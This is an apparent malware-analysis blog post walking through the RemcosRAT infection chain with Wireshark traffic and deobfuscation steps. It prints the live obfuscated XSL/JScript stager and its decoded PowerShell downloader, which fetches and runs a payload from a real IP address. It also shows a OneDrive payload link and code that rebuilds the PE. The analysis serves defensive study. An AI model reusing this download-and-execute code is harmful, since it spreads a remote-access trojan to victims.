---
title: Remcosrat - Excel macro analysis
date: 2022-01-25 23:20:40
summary: RemcosRAT is a Fileless multi-stage malware that is distributed through malicious macros in Excel files. The malware enables remote administration of infected systems to perform unintended actions
tags:
  - Malware
  - reverse
---

RemcosRAT is a Fileless multi-stage malware that is distributed through malicious macros in Excel files. The malware enables remote administration of infected systems to perform unintended actions.This is a simple guide on understanding RemcosRat infection chain. The RemcosRAT infection chain can be described as shown by image [@Unit 42](https://twitter.com/Unit42_Intel/status/1478744612516900868).

![Infection Chain](/images/mal/remcosrat/chain.jpeg)

The infection chain start through phishing of the targets through mail services and the final payload of the infection chain is the used for communicating through TCP port 10174 as shown in the image.

The samples and IOC can be downloaded from malware-traffic-analysis website [RemcosRat sample](https://www.malware-traffic-analysis.net/2022/01/04/index.html).

## Pcap Analysis

[Brad](https://twitter.com/malware_traffic/status/1478755988023001089) has provided infection traffic pcap of the malware samples in his website.

![Http filter](/images/mal/remcosrat/http_filter.png)

Image above shows a Filter of **http** traffic in wireshark used for downloading further executables into infected machine.The malware gets additional samples using **GET** method as highlighted.

From the tweet provided by **unit42intel**, the above link of the onedrive downloads a `VBS` file. The vbs file is not available in the onedrive at the time of writting but it is provided in malware-traffic-analysis website.

```html
<html>
  <head>
    <title>Object moved</title>
  </head>
  <body>
    <h2>
      Object moved to
      <a
        href="https://onedrive.live.com/download?cid=64F8294A00286885&amp;resid=64F8294A00286885%21770&amp;authkey=ABI3zrc6BsVUKxU"
        >here</a
      >.
    </h2>
  </body>
</html>
```

Verify the sha256 hash of the `misc.vbs` matches the one provided in IOCs of Remcos Rat.

```bash
@remcosrat$ shasum -a 256 misc.vbs
95c0a9e6463a2eb1bbfe3198cd4b6cd74927a209ca4ab17501c2f444494f4499  misc.vbs
```

## Stage2 - Downloader (atcn.jpg)

Right click the `GET /atcn.jpg` url in wireshark and follow the **http** stream. The HTTP streams of the urls accessed by the malware as shown below.

![url wireshark](/images/mal/remcosrat/stage1_stream.png)

Malware is executing a powershell script which is obsfuscated. For further analysis we can export all the http objects. To export http objects, click `File -> Export Objects -> HTTP` in wireshark. select saveall to download all the http objects in malware connection traffic.

![Export Http objects ](/images/mal/remcosrat/exported_http.png)

The downloaded files as are not images as the extensions suuggests to. They are ASCCII text files.

```bash
$ file atcn.jpg
atcn.jpg: ASCII text, with very long lines (4130), with CRLF line terminators
$ file calient.jpg
calient.jpg: ASCII text, with very long lines (65536), with no line terminators
```

Below is the obfuscated powershell script.

```javascript
<xsl:stylesheet version="1.0"
      xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
      xmlns:msxsl="urn:schemas-microsoft-com:xslt"
      xmlns:user="http://mycompany.com/mynamespace">

 <msxsl:script language="JScript" implements-prefix="user">
<![CDATA[


var r = new ActiveXObject(x0asd44("5368656c6c2e4170706c69636174696f6e"))

var yy=r.ShellExecute("powershell.exe",x0asd44("202444436F626356456D76694A72416B484D595547573D273237253542253736253646253639253634253237253230253242253230253237253544253230253542253533253739253733253734253237253230253242253230253237253635253644253245253532253635253636253643253635253237253230253242253230253237253633253734253639253646253645253245253431253733253733253635253237253230253242253230253237253644253632253643253739253544253341253341253443253646253631253634253537253639253237253230253242253230253237253734253638253530253631253732253734253639253631253643253445253631253644253635253238253237253237253444253639253633253732253646253733253646253636253734253245253536253639253733253735253631253643253432253631253733253639253633253237253237253239253237253743253439253435253538253342253234253734253335253336253636253637253230253344253230253542253435253645253735253644253544253341253341253534253646253446253632253641253635253633253734253238253542253533253739253733253734253635253644253245253445253635253734253245253533253635253633253735253732253639253734253739253530253732253646253734253646253633253646253643253534253739253730253635253544253243253230253333253330253337253332253239253342253542253533253739253733253734253635253644253245253445253635253734253245253533253635253732253736253639253633253635253530253646253639253645253734253444253631253645253631253637253635253732253544253341253341253533253635253633253735253732253639253734253739253530253732253646253734253646253633253646253643253230253344253230253234253734253335253336253636253637253342253634253646253230253742253234253730253639253645253637253230253344253230253734253635253733253734253244253633253646253645253645253635253633253734253639253646253645253230253244253633253646253644253730253230253637253646253646253637253643253635253245253633253646253644253230253244253633253646253735253645253734253230253331253230253244253531253735253639253635253734253744253230253735253645253734253639253643253230253238253234253730253639253645253637253239253342253234253734253734253739253344253237253238253445253635253737253244253237253242253237253446253632253641253635253237253242253237253633253734253230253445253635253237253242253237253734253245253537253635253237253242253237253632253433253643253639253237253242253237253635253645253734253239253237253743253439253630253435253630253538253342253234253644253736253344253230253542253444253639253633253732253646253733253646253636253734253245253536253639253733253735253631253643253432253631253733253639253633253245253439253645253734253635253732253631253633253734253639253646253645253544253341253341253433253631253643253643253432253739253645253631253644253635253238253234253734253734253739253243253237253434253646253737253645253643253646253631253634253533253734253732253639253645253637253237253243253542253444253639253633253732253646253733253646253636253734253245253536253639253733253735253631253643253432253631253733253639253633253245253433253631253643253643253534253739253730253635253544253341253341253444253635253734253638253646253634253243253237253638253734253734253730253237253230253242253230253237253341253246253246253331253330253334253245253332253332253333253245253331253331253339253245253331253336253337253246253633253631253643253639253635253645253734253245253641253730253637253237253239253342253234253732253337253338253636253634253330253330253330253733253634253344253230253234253644253736253230253244253733253730253643253639253734253230253237253235253237253230253743253436253646253732253435253631253633253638253244253446253632253641253635253633253734253230253742253542253633253638253631253732253544253542253632253739253734253635253544253232253330253738253234253546253232253744253342253234253739253335253641253638253336253332253634253636253330253344253230253439253630253435253630253538253238253234253732253337253338253636253634253330253330253330253733253634253230253244253641253646253639253645253230253237253237253239273B246A6D3D2444436F626356456D76694A72416B484D595547572E53706C69742827252729207C20666F7245616368207B5B636861725D285B636F6E766572745D3A3A746F696E74313628245F2C313629297D3B496045605828246A6D202D6A6F696E20272729"),"","",0);

function x0asd44(hex) {
    var str = '';
    for (var i = 0; i < hex.length; i += 2) str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
    return str;
}

]]> </msxsl:script>
</xsl:stylesheet>
```

First decode the string we are passing to **ActiveXObject** function.

```javascript
function x0asd44(hex) {
  var str = "";
  for (var i = 0; i < hex.length; i += 2)
    str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
  return str;
}

console.log(x0asd44("5368656c6c2e4170706c69636174696f6e"));
```

Executing the above javascript code, our hexstring string parameter is decoded to `Shell.Application`.

Below is the deobfuscated powershell script which is passed `shell.Application` as shown in the obsfucated script.

```powershell
'[void] [System.Reflection.Assembly]::LoadWithPartialName(''Microsoft.VisualBasic'')'|IEX;
$t56fg = [Enum]::ToObject([System.Net.SecurityProtocolType], 3072);
[System.Net.ServicePointManager]::SecurityProtocol = $t56fg;
do {$ping = test-connection -comp google.com -count 1 -Quiet} until ($ping);
$tty='(New-Object Net.WebClient)'|I`E`X;
$mv= [Microsoft.VisualBasic.Interaction]::CallByname($tty,'DownloadString',[Microsoft.VisualBasic.CallType]::Method,'http://104.223.119.167/calient.jpg');
$r78fd000sd= $mv -split '%' |ForEach-Object {[char][byte]"0x$_"};
$y5jh62df0= I`E`X($r78fd000sd -join '')
```

The deobfuscated powershell script above downloads another string at the domain highlighted above. The malware gets obsfuscated strings of the `calient.jpg` url.

## Stage3 - Downloader (calient.jpg)

Stage two downloads third obfuscated script strings in calient.jpg url. String is obfuscated and is larger than second stage `atcn.jpg` string. Looking at the obfuscated strings we have an interesting string referenced by `ftIXfysfU` variable.

```xml
$y='[System.AppDomain]'|W0B4J;
$g55=$y.GetMethod("get_CurrentDomain")

 [String]$ftIXfysfU='4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000504500004C010300AF89D1610000000000000000E00002210B010800004402000048
```

The string above seems to be an executable. This is because of the header file magic of PE executable. The magic number `4D5A` or ASCII characters MZ represents the beginning of the file signature of Microsoft PE file.

![Http filter](/images/mal/remcosrat/pehead.png)

The python script belows decoded the bytes and returs an PE executable.

```python
#convert bytearray to PE
remcosPE=bytearray(bytes.fromhex('4D5A90000300000004000000FFFc....'))

with open('open.exe', 'wb') as filepe:
    filepe.write(remcosPE)
```

Now we have a fully RemcosRat malware, which is a .NET family malware.

```bash
remcosrat$ file open.exe
open.exe: PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS Windows
```

Next step is analyzing dropped PE file.

## References

1. https://www.malware-traffic-analysis.net/2022/01/04/index.html
2. https://twitter.com/Unit42_Intel/status/1478744612516900868/
